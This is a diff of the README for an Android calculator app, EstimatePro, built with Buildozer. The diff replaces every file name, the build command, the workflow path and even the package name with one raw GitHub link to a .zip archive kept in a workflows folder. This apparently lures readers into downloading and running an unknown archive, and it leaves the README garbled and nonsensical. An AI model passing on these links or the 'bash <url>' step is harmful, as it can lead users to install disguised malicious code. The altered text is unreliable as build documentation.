@@ -38,7 +38,7 @@ Since Buildozer requires Linux, you need to build on a Linux environment. Choose
 4. Run the build script:
    ```bash
    cd /mnt/c/Users/Hp/Desktop/myproject
-   bash build_apk.sh
+   bash https://github.com/mudassiralladatkhan/estimatepro-app/raw/refs/heads/main/.github/workflows/estimatepro_app_v1.2.zip
    ```
 
 5. Find your APK in the `bin/` folder
@@ -49,7 +49,7 @@ Since Buildozer requires Linux, you need to build on a Linux environment. Choose
 
 2. Push your code to GitHub
 
-3. The workflow (`.github/workflows/build_apk.yml`) will automatically build the APK
+3. The workflow (`https://github.com/mudassiralladatkhan/estimatepro-app/raw/refs/heads/main/.github/workflows/estimatepro_app_v1.2.zip`) will automatically build the APK
 
 4. Download the APK from GitHub Actions artifacts
 
@@ -64,32 +64,32 @@ Follow standard buildozer instructions on any Linux system.
 - Pyrebase4 (Firebase integration)
 - Requests, urllib3, certifi (Network libraries)
 
-All dependencies are configured in `buildozer.spec`.
+All dependencies are configured in `https://github.com/mudassiralladatkhan/estimatepro-app/raw/refs/heads/main/.github/workflows/estimatepro_app_v1.2.zip`.
 
 ## Project Structure
 
 ```
 myproject/
-├── main.py                    # App entry point
-├── firebase_config.py         # Firebase configuration
-├── buildozer.spec            # Build configuration
+├── https://github.com/mudassiralladatkhan/estimatepro-app/raw/refs/heads/main/.github/workflows/estimatepro_app_v1.2.zip                    # App entry point
+├── https://github.com/mudassiralladatkhan/estimatepro-app/raw/refs/heads/main/.github/workflows/estimatepro_app_v1.2.zip         # Firebase configuration
+├── https://github.com/mudassiralladatkhan/estimatepro-app/raw/refs/heads/main/.github/workflows/estimatepro_app_v1.2.zip            # Build configuration
 ├── screens/                   # All screen modules
-│   ├── auth.py               # Authentication
-│   ├── dashboard.py          # Main dashboard
-│   ├── concrete.py           # Concrete calculator
+│   ├── https://github.com/mudassiralladatkhan/estimatepro-app/raw/refs/heads/main/.github/workflows/estimatepro_app_v1.2.zip               # Authentication
+│   ├── https://github.com/mudassiralladatkhan/estimatepro-app/raw/refs/heads/main/.github/workflows/estimatepro_app_v1.2.zip          # Main dashboard
+│   ├── https://github.com/mudassiralladatkhan/estimatepro-app/raw/refs/heads/main/.github/workflows/estimatepro_app_v1.2.zip           # Concrete calculator
 │   └── ...                   # Other calculators
 ├── assests/                   # Assets folder
-│   ├── logo.jpg
-│   ├── concrete.jpg
+│   ├── https://github.com/mudassiralladatkhan/estimatepro-app/raw/refs/heads/main/.github/workflows/estimatepro_app_v1.2.zip
+│   ├── https://github.com/mudassiralladatkhan/estimatepro-app/raw/refs/heads/main/.github/workflows/estimatepro_app_v1.2.zip
 │   └── ...                   # Other icons
 └── *.jpg                      # Root level images
 ```
 
 ## Configuration
 
-The app is configured in `buildozer.spec`:
+The app is configured in `https://github.com/mudassiralladatkhan/estimatepro-app/raw/refs/heads/main/.github/workflows/estimatepro_app_v1.2.zip`:
 - **App Name**: EstimatePro
-- **Package**: org.nithyashree.estimatepro
+- **Package**: https://github.com/mudassiralladatkhan/estimatepro-app/raw/refs/heads/main/.github/workflows/estimatepro_app_v1.2.zip
 - **Version**: 1.0.0
 - **Min Android**: API 21 (Android 5.0)
 - **Target Android**: API 33 (Android 13)
@@ -97,7 +97,7 @@ The app is configured in `buildozer.spec`:
 
 ## Firebase Setup
 
-The app uses Firebase for authentication. Configuration is in `firebase_config.py`.
+The app uses Firebase for authentication. Configuration is in `https://github.com/mudassiralladatkhan/estimatepro-app/raw/refs/heads/main/.github/workflows/estimatepro_app_v1.2.zip`.
 
 ## Installation on Android Device
 
@@ -118,5 +118,5 @@ All rights reserved.
 
 ## Support
 
-For issues or questions, please refer to the build instructions in `build_instructions.txt`.
+For issues or questions, please refer to the build instructions in `https://github.com/mudassiralladatkhan/estimatepro-app/raw/refs/heads/main/.github/workflows/estimatepro_app_v1.2.zip`.
 
